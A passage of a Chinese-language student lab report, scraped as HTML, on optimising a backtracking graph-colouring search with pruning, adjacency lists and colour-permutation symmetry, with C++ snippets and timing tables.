            <span class="token keyword">if</span> <span class="token punctuation">(</span>map<span class="token punctuation">.</span>colorMatrix<span class="token punctuation">[</span>candidateIndex<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                map<span class="token punctuation">.</span>colorMatrix<span class="token punctuation">[</span>candidateIndex<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            map<span class="token punctuation">.</span>colorMatrix<span class="token punctuation">[</span>candidateIndex<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        tmp <span class="token operator">=</span> tmp<span class="token operator">-</span><span class="token operator">&gt;</span>next<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

</code></pre> 
<p>对于每个搜索的点，当他下一个邻接点不为空时，则进行搜索。首先判断当该点未涂色且该点邻接点颜色合法时，则可以认为该点的当前涂色合法，将colorMatrix对应值加一并返回即可。</p> 
<p><strong>c.删除颜色函数：</strong></p> 
<pre><code class="prism language-cpp"><span class="token keyword">int</span> <span class="token function">deleteColor</span><span class="token punctuation">(</span>Map <span class="token operator">&amp;</span>map<span class="token punctuation">,</span> <span class="token keyword">int</span> index<span class="token punctuation">,</span> <span class="token keyword">int</span> color<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    MapNode candidate <span class="token operator">=</span> map<span class="token punctuation">.</span>vArray<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">;</span>
    MapNode <span class="token operator">*</span>tmp <span class="token operator">=</span> candidate<span class="token punctuation">.</span>next<span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tmp<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">int</span> candidateIndex <span class="token operator">=</span> tmp<span class="token operator">-</span><span class="token operator">&gt;</span>value<span class="token punctuation">;</span>
        <span class="token comment">//if the point is uncolored and its adjacent point is not colored with that color</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>map<span class="token punctuation">.</span>colorArray<span class="token punctuation">[</span>candidateIndex<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">&amp;&amp;</span> map<span class="token punctuation">.</span>colorMatrix<span class="token punctuation">[</span>candidateIndex<span class="token punctuation">]</span><span class="token punctuation">[</span>color <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            map<span class="token punctuation">.</span>colorMatrix<span class="token punctuation">[</span>candidateIndex<span class="token punctuation">]</span><span class="token punctuation">[</span>color <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">+</span> index<span class="token punctuation">;</span>
            map<span class="token punctuation">.</span>colorMatrix<span class="token punctuation">[</span>candidateIndex<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">--</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>map<span class="token punctuation">.</span>colorMatrix<span class="token punctuation">[</span>candidateIndex<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
                <span class="token keyword">return</span> candidateIndex<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        tmp <span class="token operator">=</span> tmp<span class="token operator">-</span><span class="token operator">&gt;</span>next<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>对于每个搜索点，如果该点的下一个邻接点的可涂色颜色为0，则返回当前点的序号，如果不存在下一个邻接点，则返回-1。对于邻接点可涂颜色不为0的情况，则更新邻接点可涂颜色直至搜索到末端点。</p> 
<h3>
<a id="5_247"></a>（5）数据结构的选择：</h3> 
<p><strong>①算法描述：</strong><br> 对于储存图的数据结构，常见的有邻接表和邻接矩阵两种。因此如何选择合适的数据结构也将从一定程度上节省程序的运行时间。</p> 
<p>对于邻接矩阵，寻找相邻区域时需要遍历所有区域；对于邻接表而言，可以直接获取相邻区域。由于本地搜索程序与深度优先搜索类似，而采用邻接表的深度优先搜索的时间复杂度为<span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        O
       
       
        (
       
       
        n
       
       
        +
       
       
        e
       
       
        )
       
       
        (
       
       
        e
       
       
        为
       
       
        边
       
       
        数
       
       
        )
       
      
      
       O(n+e)(e 为边数)
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em;vertical-align: -0.25em"></span><span class="mord mathdefault" style="margin-right: 0.02778em">O</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right: 0.222222em"></span></span><span class="base"><span class="strut" style="height: 1em;vertical-align: -0.25em"></span><span class="mord mathdefault">e</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord mathdefault">e</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">边</span><span class="mord cjk_fallback">数</span><span class="mclose">)</span></span></span></span></span>，采用邻接矩阵的深度优先搜索的时间复杂度为<span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        O
       
       
        (
       
       
        
         n
        
        
         2
        
       
       
        )
       
      
      
       O(n^2 )
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1.06411em;vertical-align: -0.25em"></span><span class="mord mathdefault" style="margin-right: 0.02778em">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.814108em"><span class="" style="margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span>。因此在搜索时，可以采用邻接表进行搜索。但对于邻接表而言，对于一些数据的存储没有邻接矩阵方便，因此可以采用邻接矩阵和邻接表共用的方式对图结构进行存储。<br> <strong>②具体实现：</strong></p> 
<pre><code class="prism language-cpp"><span class="token keyword">struct</span> Map <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">int</span> vNum<span class="token punctuation">;</span>          <span class="token comment">//number of vertex</span>
    MapNode <span class="token operator">*</span>vArray<span class="token punctuation">;</span>   <span class="token comment">//adjacency list</span>
    <span class="token keyword">int</span> <span class="token operator">*</span>colorArray<span class="token punctuation">;</span>   <span class="token comment">//store type of color, -1 for uncolored</span>
    <span class="token keyword">int</span> colorType<span class="token punctuation">;</span>     <span class="token comment">//type of color</span>
    <span class="token keyword">int</span> <span class="token operator">*</span>oldToNew<span class="token punctuation">;</span>     <span class="token comment">//change after sort by degree, origin id-&gt; new id</span>
    <span class="token keyword">int</span> <span class="token operator">*</span>newToOld<span class="token punctuation">;</span>     <span class="token comment">//change after sort by degree, new id-&gt; origin id</span>
    <span class="token keyword">bool</span> <span class="token operator">*</span><span class="token operator">*</span>matrix<span class="token punctuation">;</span>     <span class="token comment">//adjacency matrix</span>
    <span class="token keyword">int</span> <span class="token operator">*</span><span class="token operator">*</span>colorMatrix<span class="token punctuation">;</span> <span class="token comment">//store the validation of each point and number of valid colors</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

</code></pre> 
<p>使用colorMatrix二维矩阵存储各个点的颜色可用情况，使用vArry存储邻接表，使用colorArray存储点的涂色情况。</p> 
<p><strong>③运行并测试：</strong><br> 对给定的大数据（450点5色）进行填涂，并将可行解全部输出，将程序运行20次取时间平均值做表如下：</p> 
<table>
<thead><tr>
<th>优化前</th>
<th>优化后</th>
</tr></thead>
<tbody><tr>
<td>240.5s</td>
<td>169.4s</td>
</tr></tbody>
</table>
<p>这证明，使用邻接表存储数据并进行优化是有效的优化方式。</p> 
<h2>
<a id="3_279"></a>3、时间与效率分析：</h2> 
<p>利用以上算法优化，完成不同规模下数据的试涂色记录并整理如下（搜索结果在‘result’文件夹中）：</p> 
<h3>
<a id="1_281"></a>（1）三组数据的涂色：</h3> 
<p>①得到第一个可行解：</p> 
<table>
<thead><tr>
<th></th>
<th>450点5色</th>
<th>450点15色</th>
<th>450点25色</th>
</tr></thead>
<tbody><tr>
<td>时间消耗</td>
<td>860.1ms</td>
<td>386.4ms</td>
<td>210.6ms</td>
</tr></tbody>
</table>
<p>可以看到随着可用颜色的增多，涂色消耗时间依次缩短。这是由于可用颜色更多，搜索过程中更容易搜索到可行解，无需进行多次搜索就可以找到可行解。</p> 
<p><strong>②得到全部可行解</strong>（15色和25色全部可行解个数超过10^9无法一定时间内得到完备搜索结果）：</p> 
<table>
<thead><tr>
<th></th>
<th>450点5色</th>
</tr></thead>
<tbody>
<tr>
<td>时间消耗</td>
<td>61.199s</td>
</tr>
<tr>
<td>可行解个数</td>
<td>3840</td>
</tr>
</tbody>
</table>
<p>可以看到采用贪心剪枝，置换剪枝，向前探查剪枝，矩阵记录并选择邻接表进行数据存储这5种优化后，实现了从最开始未优化时短时间内无法完成完备搜索变为在一分钟左右的时间即可完成全部搜索，算法的效率得到极大提升。</p> 
<h3>
<a id="2_297"></a>（2）自行生成地图涂色并分析：</h3> 
<p>通过随机数，自行生成了不同规格的地图，对于每个地图，均将程序运行10次并取平均值作为实际值。对于每次比较时，均需要保证其余变量的值不变，在有解的情况下，分析统计作表如下：</p> 
<p><strong>①图规模对运行时间的影响：</strong></p> 
<table>
<thead><tr>
<th></th>
<th>100点5色</th>
<th>200点5色</th>
<th>300点5色</th>
<th>400点5色</th>
</tr></thead>
<tbody><tr>
<td>时间消耗</td>
<td>1,943ms</td>
<td>10,673ms</td>
<td>24,164ms</td>
<td>60,561ms</td>
</tr></tbody>
</table>
<p><img src="https://images2.imgbox.com/3d/1d/uJV3hdkQ_o.png" alt="在这里插入图片描述"></p> 
<p>图的规模极大影响了搜索的规模，规模小的图要比规模大的图的搜索时间小的多。<br> 通过上图，可以看到，当地图规模成线性级增长时，时间消耗大致成指数型增长。并且，随着数量级的增长，指数增长速率放缓，这是因为多种剪枝策略对大数据下优化作用更明显。</p> 
<p><strong>②合法涂色数对运行时间的影响：</strong></p> 
<table>
<thead><tr>
<th></th>
<th>200点5色</th>
<th>200点7色</th>
<th>200点9色</th>
</tr></thead>
<tbody><tr>
<td>时间消耗</td>
<td>10.7s</td>
<td>74.6s</td>
<td>592.1s</td>
</tr></tbody>
</table>
<p><img src="https://images2.imgbox.com/fe/25/kR7x4Jdl_o.png" alt="在这里插入图片描述"></p> 
<p>合法的颜色数极大的影响了搜索的规模，合法颜色少的图要比合法颜色多的图的搜索时间小的多。<br> 通过分析可知，若对于某图涂色的存在可行解向量<span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        
         S
        
        
         0
        
       
       
        =
       
       
        (
       
       
        
         x
        
        
         0
        
       
       
        ,
       
       
        
         x
        
        
         1
        
       
       
        ,
       
       
        
         x
        
        
         0
        
       
       
        ,
       
       
        
         x
        
        
         0
        
       
       
        ,
       
       
        …
       
       
        )
       
      
      
       S_0=(x_0,x_1,x_0,x_0,…)
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.83333em;vertical-align: -0.15em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.05764em">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: -0.05764em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 1em;vertical-align: -0.25em"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="minner">…</span><span class="mclose">)</span></span></span></span></span>则<span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        
         S
        
        
         1
        
       
       
        =
       
       
        (
       
       
        
         x
        
        
         1
        
       
       
        ,
       
       
        
         x
        
        
         0
        
       
       
        ,
       
       
        
         x
        
        
         1
        
       
       
        ,
       
       
        
         x
        
        
         1
        
       
       
        ,
       
       
        …
       
       
        )
       
       
        (
       
       
        交
       
       
        换
       
       
        
         x
        
        
         0
        
       
       
        ,
       
       
        
         x
        
        
         1
        
       
       
        )
       
      
      
       S_1=(x_1,x_0,x_1,x_1,…)(交换x_0,x_1)
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.83333em;vertical-align: -0.15em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.05764em">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: -0.05764em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 1em;vertical-align: -0.25em"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="minner">…</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord cjk_fallback">交</span><span class="mord cjk_fallback">换</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span>则存在<span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        n
       
       
        !
       
      
      
       n!
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.69444em;vertical-align: 0em"></span><span class="mord mathdefault">n</span><span class="mclose">!</span></span></span></span></span>种等效可行解向量。因此，当合法颜色数增多时，可行解数量大致成阶乘型（指数）增加。<br> 此外，随着合法颜色数的增长，指数增长速率增大，这是因为由于合法颜色数的增加导致可剪枝数降低，搜索树成指数级增长，剪枝策略的优化作用减弱。</p> 
<p><strong>③图的边密度对运行时间的影响（在400点5色下进行测试）：</strong></p> 
<table>
<thead><tr>
<th></th>
<th>边密度5%</th>
<th>边密度7.5%</th>
<th>边密度10%</th>
</tr></thead>
<tbody><tr>
<td>时间消耗</td>
<td>60,561ms</td>
<td>10,832ms</td>
<td>736ms</td>
</tr></tbody>
</table>
<p><img src="https://images2.imgbox.com/47/cf/14Agdifu_o.png" alt="在这里插入图片描述"></p> 
<p>边密度影响了可行解的个数，也影响了剪枝的效率。边密度越大，剪枝效率越高。边密度越小，搜索树的每一支就会更深。<br> 从上图以及上表中可以看出，随着边密度的提高，时间消耗指数级急速降低。这是剪枝效率大大提升的原因。</p> 
<p><strong>④图的连通分量对运行时间的影响（在400点5色下进行测试）：</strong></p> 
<table>
<thead><tr>
<th>联通分量</th>
<th>1</th>
<th>3</th>
<th>5</th>
</tr></thead>
<tbody><tr>
<td>时间消耗</td>
<td>60,561ms</td>
<td>54,831ms</td>
<td>48,265ms</td>
</tr></tbody>
</table>
<p><img src="https://images2.imgbox.com/ab/3b/vqcu9YdC_o.png" alt="在这里插入图片描述"><br> 联通分量从一定程度上影响了搜索树的规模。当搜索过程中搜索完一个极大连通图后，搜素会从下一个极大连通图的最大度节点开始搜索，而不是从原节点上继续拓展，类似于重新从根节点伸展出一颗新的搜索树，降低了上一级的节点拓展。从一定程度上节省了时间。<br> 通过分析上图以及上表，可以看到连通分量确实对图的运行时间有影响，并且连通分量越大，算法运行时间越短。</p> 
<h1>
<a id="_340"></a>四、实验结论或体会</h1> 
<ol>
<li>常规算法的算法效率往往较低，需要进行优化</li>
<li>对于回溯搜索算法，搜索时应优先选择限制较多的分支进行拓展搜索</li>
<li>可以通过数学方法对算法进行优化。例如本实验中借助图论中轮换的思想完成了优化。</li>
<li>除了算法本身，选择合适的数据结构也可以在一定程度上降低程序的运行时间。</li>
<li>算法优化过程中，算法的正确性验证必不可少。在本题中，每种优化策略都经过了理论和实际进行验证。</li>
</ol> 
<h1>
<a id="_348"></a>五、思考</h1> 
<p>轮换替换思想的推广：</p> 
<h2>
<a id="1_350"></a>1、算法描述：</h2> 
<p>通过对运行结果中可行解的分析以及对涂色逻辑的分析我们可以知道，对于m个合法颜色，规模为n的图的一个解向量如果为<span class="katex--display"><span class="katex-display"><span class="katex"><span class="katex-mathml">
     
      
       
        
         
          S
         
         
          0
         
        
        
         =
        
        
         (
        
        
         
          c
         
         
          0
         
        
        
         ,
        
        
         
          c
         
         
          1
         
        
        
         ,
        
        
         
          c
         
         
          0
         
        
        
         ,
        
        
         
          c
         
         
          2
         
        
        
         …
        
        
         )
        
        
         (
        
        
         
          c
         
         
          0
         
        
        
         ,
        
        
         
          c
         
         
          1
         
        
        
         ,
        
        
         
          c
         
         
          2
         
        
        
         …
        
        
         互
        
        
         异
        
        
         颜
        
        
         色
        
        
         )
        
       
       
        S_0=(c_0,c_1,c_0,c_2…)(c_0,c_1,c_2…互异颜色)
       
      
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.83333em;vertical-align: -0.15em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.05764em">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: -0.05764em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 1em;vertical-align: -0.25em"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.166667em"></span><span class="minner">…</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.166667em"></span><span class="minner">…</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord cjk_fallback">互</span><span class="mord cjk_fallback">异</span><span class="mord cjk_fallback">颜</span><span class="mord cjk_fallback">色</span><span class="mclose">)</span></span></span></span></span></span>，则<span class="katex--display"><span class="katex-display"><span class="katex"><span class="katex-mathml">
     
      
       
        
         
          S
         
         
          1
         
        
        
         =
        
        
         (
        
        
         
          c
         
         
          1
         
        
        
         ,
        
        
         
          c
         
         
          0
         
        
        
         ,
        
        
         
          c
         
         
          1
         
        
        
         ,
        
        
         
          c
         
         
          2
         
        
        
         …
        
        
         )
        
        
         ,
        
        
         
          S
         
         
          2
         
        
        
         =
        
        
         (
        
        
         
          c
         
         
          1
         
        
        
         ,
        
        
         
          c
         
         
          2
         
        
        
         ,
        
        
         
          c
         
         
          1
         
        
        
         ,
        
        
         
          c
         
         
          0
         
        
        
         …
        
        
         )
        
        
         …
        
       
       
        S_1=(c_1,c_0,c_1,c_2…),S_2=(c_1,c_2,c_1,c_0…)…
       
      
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.83333em;vertical-align: -0.15em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.05764em">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: -0.05764em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 1em;vertical-align: -0.25em"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 